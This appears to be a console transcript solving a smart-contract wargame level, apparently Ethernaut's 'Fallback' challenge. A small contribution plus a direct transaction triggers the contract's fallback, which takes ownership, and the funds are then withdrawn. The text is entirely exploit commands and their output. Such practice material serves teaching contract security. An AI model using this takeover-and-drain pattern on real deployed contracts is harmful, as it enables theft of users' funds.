await contract.owner();
'0x9CB391dbcD447E645D6Cb55dE6ca23164130D008'
player
'0x355E8D1524fc4BC33744b15D44c688924959Ad67'
await contract.contribute({value: 1});
await contract.sendTransaction({value: 1});
await contract.withdraw();

await contract.owner();
'0x355E8D1524fc4BC33744b15D44c688924959Ad67'